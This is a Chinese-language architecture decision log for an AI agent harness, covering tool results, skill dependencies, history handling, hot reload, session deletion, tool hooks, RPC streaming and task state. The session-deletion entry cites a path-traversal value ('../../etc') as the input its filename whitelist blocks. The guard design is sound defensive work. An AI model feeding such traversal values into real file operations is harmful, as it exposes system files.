<a id="log-2026-09-12-tool-result"></a>

## 2026-09-12 | 结构化返回值：content 保留前缀、status 走机器通道，而不是让模型协议改版

**决策**：`ToolResult = { status: ToolStatus, content: string }`，其中 **content 保留 `[前缀]` 且措辞与改前逐字节一致**，status 是给机器读的分类字段；五个构造器（toolOk/toolInvalid/toolError/toolVerifyFailed/toolNegative）是唯一入口，前缀由构造器生成、handler 不手写。

**决策过程**

1. 改前"算不算失败"靠 agent-loop 对前缀 startsWith——2026-09-06 决策日志已记过这是欠账（"结构化返回值这一步没做"）。两条路：**A. 让模型协议改版**（content 去掉前缀，纯靠结构）→ 波及所有提示词、会话历史格式、`is_error` 映射、以及所有断言结果文本的测试，收益只是"文本干净一点"；**B. 双通道**（文本不动 + 加机器字段）→ 消费方读字段、模型读文本，互不干扰。
2. 选 B。前缀对模型本身是**有用信息**（`[NO_MATCH]` 与 `[ERROR]` 的区别模型一眼可读，这是"输出格式统一为 `[状态标识]`"这条工具层设计原则的初衷），没有理由把它从模型视野里拿掉——要消灭的不是前缀，是"靠解析前缀做决策"。
3. 替身迁移的取舍：`ToolProvider.execute` 返回契约直接改 `ToolResult`，scripts/ 下 17 处假 ToolProvider 一轮迁完。考虑过 `string | ToolResult` 联合 + 兼容归一化，放弃——兼容层就是把旧协议养在机器里当 dead code，与"`parse` 是可选成员 → 绕过合法"是同一种病。

**关键取舍**

- **`toolStatusFails` 只此一份**：agent-loop 与验证套件都调它，不许各自 startsWith/重抄名单——副本会漂移，这正是旧协议的病根（verify-edit C4b / verify-tools E11 钉死这条接线）。
- **`ToolNegativePrefix` 用类型限定**五个既有标识而非开放 string：新否定前缀必须显式扩名单，防止"随手发明前缀"借尸还魂。
- **历史回放侧不动**：anthropic.ts 的 `is_error` 仍按 `[工具` 前缀判（历史消息只有文本），不在本轮顺手改存储格式——那是另一个量级的变更，别搭车。

<a id="log-2026-09-12-skill-deps"></a>

## 2026-09-12 | 技能依赖追踪：声明式 frontmatter 而非程序化 addDependency——不给"支持但未接线"债添第四笔

**决策**：依赖的唯一声明口是技能 frontmatter 的 `depends: a, b`（解析进 `Skill.depends`）；`SkillLoader.getDependents(name)` 反查；热重载通知载荷带 `broken`（因本次删除失去依赖的技能名）。**不做 `addDependency`**。

**决策过程**

1. TODO 原写 "addDependency / getDependents"。盘调用方时发现：`addDependency` 若照做，全 `src/` **没有任何运行期调用方**——技能依赖在运行期没有"动态增删"的真实场景（技能是用户写的静态文件，热重载整批刷新清单，不存在"代码临时挂一条依赖"的需求）。
2. 本仓库为"公开方法/格式字段存在、调用方为零"付过三次学费：`runtime.onInput()`（债 7）、`appendMessage` 的 `extra`（债 9）、`PermissionProvider.clear()`（债 10）。第四笔不添：API 面与真实消费者严格对齐，公开方法必须在 `src/` 里有活着的调用方，否则不公开。
3. 所以只落地有真实消费者的部分：**声明**（frontmatter，用户可写）→ **反查**（getDependents，被 reload 的 broken 计算真实调用）→ **断裂感知**（broken，被 TreeUI 提示行真实消费）。声明解析的边界（空白容忍、去重保序、非字符串值返回空数组）都在纯函数 `parseDepends` 里钉死。

**关键取舍**

- **broken 只描述"本次删除导致的断裂"**，不吞并"声明悬空"（依赖了从未存在的技能）：后者是声明质量问题的静态势，与热重载事件无关，归系统提示词的「缺失」标注每轮如实暴露。两种问题两个出口，混在一个信号里两头都说不清。
- **`ctx.skillDeps` 用可选成员**而不是改 `skills: string[]` 的形状：段落函数对旧 ctx（无此成员的替身/扩展）优雅退化成纯列表，与 `ToolProvider.permissionDetail?` 同一手法。
- **悬空名字也可查**：`getDependents('ghost')` 返回声明者而非报空——反查的语义是"谁声明了依赖 X"，与 X 是否存在正交，这正是排查悬空声明要用的形状。

<a id="log-2026-09-12-history-structured"></a>

## 2026-09-12 | 历史结构化接通：三个策略里选"方案 B"，降级是转写不是过滤

**决策**：跨轮工具历史按 thinking 开关分叉——thinking 关 → 全量结构化回传；thinking 开 → 降级纯文本。`thinkingBlocks` 不落盘。

**决策过程**

1. 候选三案：**A** thinking 块也落盘、任何模式全量回放（保真最高）；**B** 按 thinking 开关分叉（thinking 关时两条协议线路都合法，白白可回传）；**C** 只接写侧、请求侧维持丢弃（模型仍看不到，"接通"只完成一半）。用户拍板 **B**——实现/收益比最好，且 A 是 B 的纯增量（先 B 后 A 不返工）。
2. A 被否的具体账：契约要给 `MessageEntry` 加 `thinkingBlocks`、三个存储后端都要动、compaction 摘要与块的交互要对齐、会话文件明显变大（thinking 文本很长）——而 thinking-on 场景本轮循环内本就全保真，跨轮缺的主要是"上轮调了什么"的回忆，任务规划由 plan 注入与清单驱动顶着。
3. **分叉的实现位置**：thinking 判定从"组装之后"上移到"组装之前"，历史组装按 `thinkingOn` 走两条不同映射；安全阀原样保留当兜底（正常路径永不触发，漏网才拦）。
4. **降级分支的形状**（新套件 C5 首跑揪出的缺口）：tool 结果不能原样保留 role='tool'——降级视图里它丢了 `tool_call_id` 成孤儿消息，两条协议都不认；纯工具调用的 assistant 轮 content 为空，空内容消息同样不合法。所以降级 = **转写**（tool 结果转 `[工具 X 结果] …` 的 user 文本、空 assistant 轮剔除），信息保住、只丢结构。
5. **steer 条目时序的取舍**：runtime 只知道"引导在本轮内被吸收"，拿不到循环内精确位置，独立 user 条目落在工具循环之前；真实时序由 agent-loop 原地追加进 tool 结果的 `[用户引导]` 文本承载。两份记录并存，时序忠实性以 tool 结果内嵌那份为准。

<a id="log-2026-09-12-skill-hot-reload"></a>

## 2026-09-12 | 技能热重载："谁通知 UI"这次不取消、不补线，而是发现根本不用通知

**决策**：`SkillLoader` 落地 `startWatch`/`stopWatch`/`reload`/`onChange`；提示词层**零接线**，观察者只服务 UI 提示。

**决策过程**

1. 动手前先回答 TaskStore 那次登记的老问题——"把状态从文件搬进内存后，谁通知 UI"。盘 consumers 时发现这次局面与 TaskStore 根本不同：任务面板是**常驻组件**，不通知就静默；而技能清单的唯一消费点是 `runSingleTurn` 里的 `systemPromptService.build`，它**每轮请求重新执行、现取 `getAll()`**——内存清单一刷新，下一轮自动生效。
2. 所以答案不是"补一根通知线"也不是像压缩服务那样"取消通知需求"，而是**确认系统里已经没有需要通知的人**：LLM 侧自愈；TreeUI 是唯一想"看见变化"的消费者，走 `onChange` 观察者（TaskStore 同款零依赖回调集合，刻意不走事件总线——SkillLoader 不该依赖 runtime/events）。
3. 顺带探针实锤装配 bug：`SkillLoader('skills')` 拼出 `skills/skills/`，运行期技能数恒为 0。修法传 `'.'`，并把路径拼法收进 Loader 基类 `dirFor()` 单一来源。

**关键取舍**

- **fs.watch 而非轮询**：零依赖既定立场；`persistent:false` 让 watcher 不独自撑事件循环，进程退出无需显式 stop。
- **防抖 300ms 而非每事件 reload**：编辑器一次保存触发一串 change/rename；变异测试证明摘掉防抖后三连写变 6 次 reload。
- **watcher error 静默退场**：目录被删时内存清单保持旧值，LLM 继续用旧视图——fail-safe 优于崩溃（与 tool-hooks 的 fail-open 同族：基础设施出错不应拖垮业务）。
- **通知载荷带增删差**：UI 提示要能说清"变了什么"（+x -y），在 notify 侧算好比让每个消费者自己 diff。

**教训登记**：verify-ui 的假 runtime 缺 `getSkillLoader` 会被 `start()` 里的新订阅炸到——"契约加必需成员不会在 tsc 层面暴露，只能逐处数替身"这条纪律再次应验（本次是在写套件前盘点出来的，实跑 zero 红）。

<a id="log-2026-09-12-fork-summary"></a>

## 2026-09-12 | 分支摘要：上午"核实后关闭"，下午用户拍板仍实现——两次反转的完整记录

**决策**：`/history` 落地"带摘要从此继续"（菜单选项，用户自选触发），压缩视图裁剪与 fork 文件 leaf 持久化两个 bug 一并修复。

**反转链条（为什么上午关、下午做）**

1. 上午关闭的论据有两条：fork 已复制整条前缀（LLM 一直知道旧线）+ 压缩每轮请求前跑（fork 长前缀下一轮即被压）。第二条**隐含假设**"压缩视图长期生效"——没验证过。
2. 用户拍板"仍实现"后，动手前先探针核实现状，坐实假设是坏的：`getMessages()` 全量返回（注释声称裁剪、代码没做），压缩收益只活一轮；且 fork 文件的 leaf 停在 fork 点，重开后连新聊的消息都丢。**"关闭"结论的前半句（fork 已复制前缀）依然成立，后半句（压缩自动兜底）不成立。**
3. 于是正确形态不是推翻重做，而是：修好视图裁剪 + leaf 持久化，fork 摘要作为菜单选项补在"修复后的地基"上——它仍有独立价值（fork 那一刻就要摘要，不等下一轮阈值触发；且短前缀分叉不会被硬压）。

**关键取舍**

- **菜单选项 vs 自动摘要**：fork 的审计立场（前缀 = 原线忠实快照）不因新功能破坏；摘要是否牺牲细节由用户自选。
- **压缩服务 storage 改每次调用传入**：三个 bug 同根——"构造期绑死 + 状态漂移"。无状态化消灭了"谁通知服务"这条通知线（与 TaskStore.onChange 那次的教训同型：把状态从 A 搬到 B，必须回答"谁负责通知"——这次直接取消通知需求）。
- **只认最后一个 compaction**：与 SystemPromptService 摘要层既有口径一致，不新造"多层摘要栈"概念。

**教训登记**：核实结论也是结论，也要核实它的前提——"由另一条路解决"的判断，得先验证那条路真的通了（本轮那条路上有个没接线的开关：注释写了、代码没做）。

<a id="log-2026-09-12-session-repo"></a>
## 2026-09-12 — 会话删除的守卫放几层、比对靠什么：三层里 UI 只是提示

**场景**：会话管理从单会话存储里分家时补上删除能力。删除是第一个**破坏性**的会话操作，
守卫放几层、当前会话怎么识别，都是能力边界决策。

**选项与理由**：

- **删除守卫放几层** —— A) 只在 UI 层禁选当前会话；B) Runtime 层守卫；C) UI disabled +
  Runtime 拒删 + repo 层文件名白名单，三层各管各的。选 **C**。判据：**每层守卫只挡自己那类错**。
  A 挡不住 RPC / 命令行直达 runtime 的调用；B 挡不住 `../../etc` 这类穿越（那是"名字合不合法"，
  不是"是不是当前会话"）；repo 白名单挡不住"名字合法但它是活跃线"。三层互不替代，
  且真正承重的是 Runtime 守卫（verify-repo 变异测试摘掉它，R36/R37/R38 立刻红），
  UI 的 disabled 只是让用户不用撞到报错才知道。
- **"当前会话"怎么识别** —— A) `instanceof JsonlSessionStorage` 缩窄后取 filePath；
  B) `core/storage.ts` 加可选成员 `getFilePath?()`，Runtime 探测。选 **B**。判据：
  **storage.ts 注释里写明的历史教训**——类型双身那阵子，Runtime 被迫 instanceof 缩窄才能调可选
  成员，收敛后立了"探测可选成员"的立场；这次是同一条立场的第一次新增应用。InMemory/Mock
  无此成员 → 守卫跳过 → 不误伤（R39 有对照组钉住）。
- **sessionRepo 注入可选还是必选** —— A) 必注入（对齐"全部必注入"的子系统表）；
  B) 可选，缺省回退旧静态路径。选 **B**。判据：**mock / 兼容场景的迁移成本**。verify-permission
  等既有套件的 makeRuntime 都没给 repo，必选会让每个替身都多造一个成员；
  且 InMemory 场景下"目录管理"本来就不存在，必注入是逼着假件实现 no-op。
  代价是 runtime 里留了一条回退路径（verify-session S 段的断言相应改语义：
  钉的是"回退在场"而非"管理在 runtime"）。

**结果**：SessionRepo 契约 + 两层承重守卫 + UI 提示层，51 项验证（探针 repo 钉委托、
变异测试钉守卫）。实现见 ARCHITECTURE_LOG 锚点 log-2026-09-12-session-repo。

<a id="log-2026-09-12-tool-hooks"></a>
## 2026-09-12 — 工具钩子能做到哪一步：可拦截、不可改参；坏了怎么办：fail-open

**场景**：给工具执行加 `before_tool_call` 钩子，接口形状取决于两个语义决策，都是能力边界问题。

**选项与理由**：

- **能力边界** —— A) 只读观察（永远放行）；B) 可拦截、不可改参；C) 对齐 Pi 的完整能力
  （可拦截 + 可静默改写参数）。选 **B**（用户拍板）。判据：**能力与可调试性的交换**。
  A 做不成"危险命令拦截""审计后放行"；C 最灵活，但参数被静默换掉后，模型以为在跑原命令、
  日志记的也是原命令，实际执行的是另一条——出了问题两头对不上。B 保留了"说不"的权力，
  而拒绝是**显式**动作：工具没跑这件事，模型和日志都知道。
- **钩子坏了怎么办** —— A) fail-closed（钩子异常 → 拦截该次调用，宁可不执行）；
  B) fail-open（异常 / 形状不对 → 放行照跑，只记 stderr）。选 **B**。判据：**钩子是基础设施
  不是策略**。钩子的职责是附加控制，它自己坏了不该绑架主流程——所有工具调用集体瘫痪的代价
  远大于"某次该拦的没拦住"。风险留了痕：stderr 一定有一行，且 fail-open 只发生在
  "钩子无法表达意见"时，钩子**明确说了** deny 照样拦。
- **拦截后模型收到什么** —— A) 抛异常走既有的"工具执行失败"路径；B) 与权限拒绝同构——
  合成一条 `[工具 X 被钩子拦截]：理由` 的 tool 结果 + `tool_execution_end(ok:false)`。
  选 **B**。判据：**同一类事件只该有一种形状**。权限拒绝已经走了 B 的形状，钩子拦截是它的
  程序版孪生；走 A 会让循环的 catch 逻辑多出一种语义（"工具坏了" ≠ "被拦了"），
  且异常栈里没有理由可带。

**结果**：`decodeDeny` 纯函数 + fail-open + 同构拒绝，35 项验证（含变异测试）。
实现见 ARCHITECTURE_LOG 锚点 log-2026-09-12-tool-hooks。

<a id="log-2026-09-11-rpc-stream-shape"></a>
## 2026-09-11 — 事件怎么出进程：映射表放哪、形状怎么分、污染靠什么防

**场景**：RPC 模式要把内核事件流式推给外部前端。`subscribe()` 那根线照抄终端即可（已有两个订阅者），
真正的决策有三个，都不是"接线"层面的。

**选项与理由**：

- **映射表放哪** —— A) 内联在 `rpc.ts` 的订阅回调里；B) 独立成模块 `rpc-events.ts`。
  选 **B**。判据：**能不能不开进程测**。内联就得真起子进程、等真实 LLM 才能验，
  那种测试没人会跑；独立成"不碰 stdout、只产出普通对象"的模块，逐个事件喂进去断言即可。
  代价是多一个文件，收益是这一层从"只能集成测"降级成"可以单测"。

- **形状分不分** —— A) 所有事件统一成一种"通知"；B) 分成片（chunk）与离散（discrete）。
  选 **B**。判据：**对端能不能判断该怎么处理**。片要累加到上一条，离散要替换状态；
  合成一种，对端只能猜。判据落在命名上（ACP 的流式片一律以 `_chunk` 结尾），
  于是 `updateShape()` 可以直接从名字推出来，不必另维护一张表。

- **stdout 纯净靠什么保证** —— A) 写在注释里让人记；B) 源码扫描断言。
  选 **B**。判据：**这类 bug 的特征是"犯病的进程毫无察觉"**——写 stdout 的一方一切正常，
  崩的是读的一方，所以靠人记必然失守。变异测试已验证承重：在 `runtime.ts` 恢复一处
  `console.log`，断言精准报出行号。

**顺带更正**：本轮核实发现，`runtime.ts` 那 2 处 `console.log` 前面有
`if (!process.stdin.isTTY) return false;`，RPC 模式下**根本不会执行**。
也就是说我此前"它们会污染 RPC"的说法是错的——今天 stdout 是**碰巧干净**，不是设计上干净。
仍然改走 `console.error`：碰巧的干净会随着某次重构消失，而断言留下的是契约。

**未做且已登记**：背压策略、实验开关（通知目前无条件推送）。理由：尚无真实外部消费者，
先跑通语义，等有消费者再按真实反馈加约束。

## 2026-09-11 — 内存真相源变了怎么告诉 UI：事件总线、观察者，还是轮询

**场景**：[上一块](#log-2026-09-11-todo-store)选定"内存 `TaskStore` 为真相源"之后，任务清单在屏幕上
**完全不存在**（`src/io/` 与 `src/commands/` 里 "task" 零命中）。根因不是"忘了画"，而是缺一根通知线：
`todo` 工具改完内存就结束，它拿不到事件总线，也没有事件可发。改造前这问题不存在——"文件"天然是
任何人都能事后去读的公共物，而内存状态没有这个性质。

**方案**

- **A. 让 `todo` 工具发事件**：给 `registerBuiltinTools` 再加一个 `events` 入参。最"正规"，
  但要把 `todo/` 拖进 runtime 的依赖圈，而这个目录的立身之本是**零依赖 + 纯数据结构**。
  为了"通知"一件事赔掉一层架构约束，不划算。
- **B. store 自带观察者（`onChange`）**：store 只维护一个 `Set<() => void>`，不知道订阅方是谁；
  由 UI 反过来 import store 并订阅。**零依赖**，目录性质不变。
- **C. UI 每帧轮询**：`requestRender()` 里直接读 `taskStore.list()`。最省事，
  但"刚刚变了"这个信息丢了，且渲染时机被绑死在别的事件上（工具执行完才顺带重绘，会慢半拍）。
- **D.（B 的子问题）面板收起后怎么回看**：① 靠对话流往上翻（现成、零新增，但只有时间线没有当前快照）；
  ② `/tasks` 命令 + 保留最近一份快照；③ 推翻"全勾选即删"、让 TASK.md 留到最后。

**选择：B + C 叠加，D 取 ②**

- **B 为主**：`onChange` 是"变了立刻画一次"的那根线，也是本项目里 store 与 UI 之间唯一的契约。
  它比事件总线弱，但**弱得刚好**——需要的只是"通知"，不是"广播 + 盖时间戳 + 进 trace"。
- **C 为辅**：`requestRender()` 每帧仍无条件从 store 重建面板。这不是冗余，是**自愈**——
  万一某次通知漏了，下一帧自己就长回来了。纵深防御，两条路各自的代价都很低。
- **D 取 ②**：① 保护不了"当前快照"（面板一收起屏幕上就一个都不剩），③ 会推翻刚提交的语义。
  ② 只加一个字段，且**记录时机**刻意选在"最后一项被 `done` 的那一刻"而不是"清空时"——
  否则半途被 `clear` 掉的清单也会被当成"已完成"存进来。

**代价（诚实记下）**：观察者比事件总线少了一样东西——**不可观测**。清单的每次变更不会进 `/traces`。
目前能接受（任务状态变化不是性能/故障排查的关键路径）；真需要时再在工具层补发一个便签 span，
那时再评估要不要引入总线。

## 2026-09-11 — 任务清单的状态住在哪：文件、内存、还是工具；以及"唯一真相源"到底是谁

**场景**：`TASK.md` 那套"文件即状态"有三个真实弱点（`write` 全量重抄 / 结构只是一个正则 / 模型可谎报完成且不留痕）。要用它跑长任务，就得决定清单的状态住在哪、谁来改、怎么跨重启。

**方案**

- **A. 维持文件即状态**：继续用 `write` 维护 `TASK.md`，harness 用正则判定。零改动，但三个弱点一个不动。
- **B. 纯工具即状态**：清单只活在内存里的 `TaskStore`，模型调 `todo` 传增量。干净，但**进程一退内存就没了**，跨重启丢清单。
- **C. 混合（工具做接口、文件做持久层）**：内存 `TaskStore` 是**真相源**，`TASK.md` 是它的**投影 + 启动种子**。模型调 `todo` 传增量，工具负责改内存并把状态写盘；启动时反方向读盘当种子。
- **D.（C 的子问题）真相源到底是谁**：`store` 还是 `TASK.md`？以及人手改 `TASK.md` 算不算数？

**选择：C；真相源 = `TaskStore`，`TASK.md` 是"投影 + 存档"；手改只在启动时被吸收一次**

**理由**

- **A 不动病根**：三个弱点的本质是"状态不由运行时掌管"——重抄、正则、不留痕都是它的症状。
- **B 与 flint 的处境直接冲突**：本项目明确要跨会话续长任务，而 `TASK.md` 存在的**全部理由**就是"压缩碰不到它"。纯内存方案要先解决"让 todo 调用豁免压缩"，等于把现成的护栏拆掉重做。
- **C 同时保住两头的红利**：模型按按钮（改得清楚、可校验、可留痕），`TASK.md` 照旧存着（跨重启、抗压缩），而且 `maxTurns` 5→15 / `thinking auto` / "完成即清理"三处**一行都不用改**，只是判定源从"正则数复选框"换成"读 store"。
- **C 正好压在本项目的两条硬约束上**：零运行时依赖（内存状态 + 一个文件投影，零成本）与秒级启动（不引入任何外部存储）。
- **真相源必须是 store，不能是文件**：否则"注入读 store、判定读文件"就成了两处判定，迟早漂移——正是旧代码注释里"避免两处正则漂移"的同构病。`TASK.md` 的身份因此是"**投影 + 存档**"而非"纯投影"：纯投影丢了可以随时从真相源重生，但它丢了就没人记得清单长什么样（内存已随进程消失），所以它反过来是启动时的**种子**。
- **`render` 与 `parse` 必须严格互逆**：写盘用前者、读盘用后者，不互逆则"重启一次漂一次"。这个手法 `Log/` 的生成区已经用过（`syncText` 一份模板同给写与查），`TASK.md` 照抄。
- **手改 `TASK.md` 只在启动时被吸收一次**：这是这套设计唯一的灰色地带。定成"运行期以 store 为准、启动时以文件为种子"——实用且能解释，代价是"运行期手改文件会被下次投影覆盖"（提示词与文档均已讲明）。
- **参数保持标量、返回值即清单**：`spec.ts` 只给 5 种标量形状、且刻意不做嵌套对象；`todo` 传 `op/index/text`、**返回值就是渲染后的整份清单**。这既绕开了给 spec.ts 开数组形状的纪律冲突，也正好是"状态在 harness 侧、工具只做增量"的精髓。
- **清单只承载步骤，不承载"目标 / 经验"散文**（旧 TASK.md 有四要素）：这是刻意的简化——散文会让 store 的"可往返"破功，而目标通常已在用户消息里。若日后确需，为 store 设计一个可往返的字段，而不是让模型回填一段 blob。

## 2026-09-11 — 同一个事实被抄了 23 份：靠"看着"还是靠"去重 + 生成区"；以及 ROADMAP 已完成表里的数字算不算现状

**场景**：上一轮给 `Log/` 的数字纪律补上了机器兜底（`check-doc-numbers.mjs`，白名单 23 处「当前值」+ 两处逐套表格）。它**能抓住漂移**，但治的是症状——它默认"同一个事实就该被抄在很多地方"，于是把每一处手抄都加进名单**看着**。真正的病是**同一份事实被抄了 23 份**：加一套测试要人肉同步七八个数字，而名单本身又成了新的维护负担（将来在新地方写一处"当前值"，得同时记得加进白名单，否则那处不被查）。要不要换一种做法？

**方案**

- **A. 事件溯源 / 文档数据库**：只存变更事件，现状由重放算出。单一真相源，但读一个现状要重放全部日志。
- **B. 只做去重（L1）**：每个事实只留一个**手抄**落点，别处改成引用；白名单随之收缩。
- **C. 去重 + 生成区（L1 + L2）**：在 B 之上，把剩下那些"算得出来、又必须出现"的数字划成 `<!-- BEGIN AUTOGEN:… -->` 区块，由 `npm run docs:sync` 从**实测真值**写入。
- **D. 让 `npm run verify` 顺手把文档改对**：省一条命令。
- **E. 把数字全删、只留链接**：彻底没有副本。

**选择：C，且 `verify` 保持只读**

**理由**

- **A 已在同日 13:19 那条被否过**（需要构建管线，与 flint"零依赖、秒起"直接冲突），本轮不重开。
- **B 不够**：去重能把名单从 23 处压到 11 处，但压不下去的那几处（TESTING 顶部 blockquote 与第二节的统计）恰恰是**读者最想一眼看到**的——它们在文档最显眼的位置，又必须是数字。对这几处，"删掉只留链接"的跳转成本高于维护成本（E 因此被否）；把数字留着继续手抄，就还得靠名单看着。**生成区正好补这一格。**
- **D 被否，这是硬约束**：`gofmt -l` / `cargo fmt --check` 的范式——**校验只检查、只报红，写盘是单独一条命令**。一个会顺手改你文件的"校验"会让人不敢跑它（怕它有副作用），也会让"CI 通过"与"本地通过"变成两件事（CI 里跑它就改了文件，本地跑也改）。所以 `npm run verify` 只读，修正必须显式敲 `npm run docs:sync`。
- **落盘渲染后的 Markdown，不用 `{{占位符}}`**：`Log/` 是给人**和** Agent 的 Read 工具直接读的，占位符会让两边都读到垃圾；生成完再落盘，文件才保持"直接可读"。这也正是它能与"零构建管线"共存的唯一原因——不需要模板引擎，标记本身是 HTML 注释、渲染时不可见。
- **生成区里不许放散文**：它只接管"算得出来的事实"（套数 / 项数）。"为什么这样测""这个债为什么还留着"程序给不出来，必须由人或 AI 写——混进区块会被 `docs-sync` 覆掉。这条边界是刻意划的：**这层是用来缩小 AI 要维护的面，不是取代 AI。**
- **写与查共用同一个渲染器**：`docs-sync` 与 `check-doc-numbers.mjs` 调同一个 `syncText`（`gofmt` 亦然）。好处是两边定义不可能分家；**代价是"渲染器本身写错"时两边会一起错且完全静默**——所以 `verify-doc-numbers.ts` 的 D9 段拿**手写的期望字符串**钉渲染器输出，绝不让它自证。

## 2026-09-11 — 现状快照与追加日志要不要统一成一种维护方式；以及该补哪一环

**场景**：`Log/` 下 14 份文档按**维护方式**分成三类：规则书 ×5（只读）、现状快照 ×5（每轮同步、**会烂**）、追加日志 ×3（只追加、**不会过期**）。同一次改动要落两处（快照覆盖 + 日志追加），这是**双记账**成本——`CHANGE_LOG` 里成片的"同步项数"条目就是这个成本留下的化石。问题：要不要把两种维护方式统一起来，省掉这笔成本？

**方案**

- **A. 统一成 append-only**（快照也改成"只追加变更记录"）。单一真相源，但"读一个现状要重放 1900+ 行日志"。
- **B. 统一成可覆盖**（日志也允许改写）。省掉追加成本，但"当时为什么这么选"会被后来者覆盖掉。
- **C. 保持分工，补上两者之间缺失的自动校验。**
- **D（锚点同理）. 让标题文字继续承担契约** vs **给新条目加显式 id `<a id="…">`**。

**选择：C + D（显式 id）**

**理由**

- **A 和 B 各有一半会坏，因为它们要求其中一方放弃自己的性质。** 快照描述的是**会变的量**（"现在有哪些命令""现在测试多少项"），真值随代码改变，所以必须可覆盖——覆盖不是篡改，是把陈述更新到此刻的真值；日志描述的是**不会变的量**（"2026-09-10 那天选了什么、理由是什么"），这个命题一旦为真就永远为真，即使三个月后那个决定被推翻——"当时我们选了 A"仍然是事实，所以它必须不可改。一句话：**快照是函数，日志是事实。**
- A 这条路本仓库其实**已经判定为危险并上了锁**：`verify-docs.mjs` 把 `DECISION_LOG.md` 的标题文字钉成契约，理由是"append-only 的标题一改，历史链接就断且无法在源头修"。写一句"请勿修改"远不如让它变红结实。B 则本质上是事件溯源，自洽，但前提是配套做快照 + 折叠，而折叠规则要理解业务语义、没法机械执行——用在一个 6.7k 行、明确要"零依赖、秒起"的项目上，等于为一套文档构建管线去撞 flint 的名字护栏。
- 所以真正缺的不是"统一写法"，而是**那条链上唯一没有机器兜底的一环**：`verify-docs.mjs` 已经把"文档"变成了"被测对象"（锚点死链 + 标题契约），**唯独不管数字**。补上它就是 C。
- 选显式 id 而非继续钉标题文字：`slug = f(标题文字)` 意味着"链接不断"必须靠"文字冻住"——为了让机器能链接，人类散文被冻结，而且引用粒度粗到只能写"同日 19:01 那块"。显式 id 把依赖**倒过来**，且与 append-only 是同一种不变性（只追加不改写 → id 写一次永不改）。旧条目不动（补 id 等于改写历史），纯增量。

## 2026-09-10 — 内层引导的注入方式：追加进最后一条 tool 结果，还是新开一条 user 消息，还是只调优先级不动落点

**场景：** `steerQueue` 改前只有两个出队点，都在 Runtime 外层 `while(true)` 里（`prompt` 轮首、`runSingleTurn` 返回之后），`AgentLoop` 的 `for (let turn...)` 工具循环里**一处队列检查都没有**——用户在 Agent 调工具时说的“别这么干了”，要等整轮跑完才被读到，于是 steer 与 followUp 的实质差别只剩优先级。要定的是：这条引导**怎么**进本轮上下文。

**方案 A（追加进最后一条 tool 结果）：** 工具执行完、下一次 `llm.stream()` 之前取件，把文本追加进最后一条 `role: 'tool'` 消息的 content，前缀一行 `[用户引导]`。与既有的重复失败提示 / 收尾提示同一手法。

**方案 B（新开一条 user 消息）：** 在 assistant(tool_calls) 与 tool 结果之后 push 一条 `{ role: 'user', content: 引导 }`。

**方案 C（不动内层，只把优先级差别写清）：** 承认“引导”只是同一落点上的优先级，不做内层注入。

**选择：A**

**理由：**
- **B 会直接 400，这不只是推测。** `anthropic.ts` 的 `toAnthropicMessages` 里 `tool` 结果转成 `role: 'user'` 的 `tool_result` block，而 `user` 分支**无条件** `messages.push`——不像连续 tool 结果那样合并（只有 `tool` 分支做了“上一条也是 user 且尾块是 tool_result 就并进去”的判定）。所以 tool 结果后跟一条 user，就是连续两条 user，违反交替约束。既有注释里早就写着这条结论（重复失败保护为什么追加而不用新消息），本轮只是把它从“参数校验的角落”推广到引导
- **C 放弃了收益最大的那一档。** 模型“跑偏”只有执行过一两个工具才看得出来，内层边界正是唯一能**及时**纠偏的位置；而 abort 硬打断要处理半截 `tool_call` 不可执行、副作用不可撤销、assistant 消息没有配对 tool 结果三件事，短期内无解（见 ROADMAP 的【预留】）
- **A 的代价明确且可承受：引导文本不落会话历史。** 落盘会造出 `user,user,assistant` 序列，下次请求映射历史时又是连续两条 user → 400。要持久化得先在历史映射处做同角色合并，属另一件事（已登记为架构债第 11 条）

**两条边界是由实现侧负责的，不是调用方的负担**（契约注释里写死）：无工具调用时不取件（没有注入落点）、最后一轮不取件（取走无人消费 = 吞消息）。两条各有独立断言，且都做过**变异测试**——把 `turn < maxTurns - 1` 改成 `turn < maxTurns`，S4 立刻红两条。

## 2026-09-06 — 工具参数规则该用什么表达：自研一个小规格层，还是引 Zod / TypeBox，还是不收敛只加一致性断言

**场景：** 同一套参数规则在项目里写了两遍，且**没有任何机制保证一致**：① `builtin.ts` 里 6 份手打 JSON Schema（序列化后发给模型）② 14 处校验件调用 + 1 处手写 boolean 强转（工具层拿到 args 自己再查一遍）。两者之间唯一的纽带是人手把同一个词打了多遍：`grep` 的 `'pattern'` 在这一个工具里出现 7 次（4 处是协议性的），而 TS 一处都不检查——校验件的 key 形参类型是 `string`，写成 `'patern'` 编译通过、测试不红。取证时又查出比“不一致”更硬的一条：`registry.execute()` 只有 3 行、`tool.parameters` **一个字段都没读**——实测造一个 `required: ['mustHave']` 的工具，什么都不传 / 传一个对象 / 传 Schema 里根本不存在的参数名，三次全部返回 `[OK]`。所以那份单子的身份是“给模型的建议书”，不是契约。要定的是：用什么东西表达参数规则。

**方案 A（自研一个小规格层：`tools/spec.ts`）：** 5 个构造器（`str` / `strAllowEmpty` / `optStr` / `optPosInt` / `optBool`）覆盖现有 16 个字段，一份 spec 派生三样（Schema / `parse` / handler 入参类型），`defineTool()` 把它接进 `ToolDefinition`。零新依赖。

**方案 B（引 Zod 或 TypeBox）：** 用社区库写 schema，`zodToJsonSchema` 把它转成发给模型的 parameters，运行时用 `.parse()` 校验。表达力完整（跨字段约束 / 嵌套 / union / refine）。

**方案 C（不收敛，只加一致性断言）：** 两份副本都留着，新建一套验证脚本逐字段比对“Schema 里声明的”与“handler 里校的”是不是同一套。代码一行不改。

**选择：A**

**理由：**
- **B 的表达力本项目用不到十分之一。** 16 个字段只用得上 5 种形状，没有一处需要跨字段约束、嵌套对象、union 或 refine。引它换来的能力一处也用不上，而代价是**项目第一个运行时依赖**（`package.json` 现在没有 `dependencies` 字段，零运行时依赖是既有立场，见 TESTING.md 第一节）
- **更关键：`zodToJsonSchema` 是一座有损的桥。** `.refine()` 之类跨字段约束会被静默丢掉——而“桥两端不一致”正是本轮要治的病，不能拿一个会静默丢约束的桥去治它。自研的 `toJsonSchema()` 只读自己认识的五个字段，丢东西会在 `verify-spec` ④ 段当场红
- **C 治不了真病。** 一致性断言只能保证“两份副本说得一样”，而改前的病不止是“可能不一致”：`execute()` 一个字段都没读，所以就算两份完全一致，`{pathh:'typo'}` 仍然静默搜全库报 `[OK]`、`String(123)` 仍然过关。C 修的是“文案对不上”，洞在“没人执行”
- **A 顺手把类型判断点从 6 个工具收到 1 个函数。** 改前每个 handler 自己 `String(val)` / `Number(val)`，现在只有 `coerce()` 一处做参数类型判断，四个盲区一次堵完
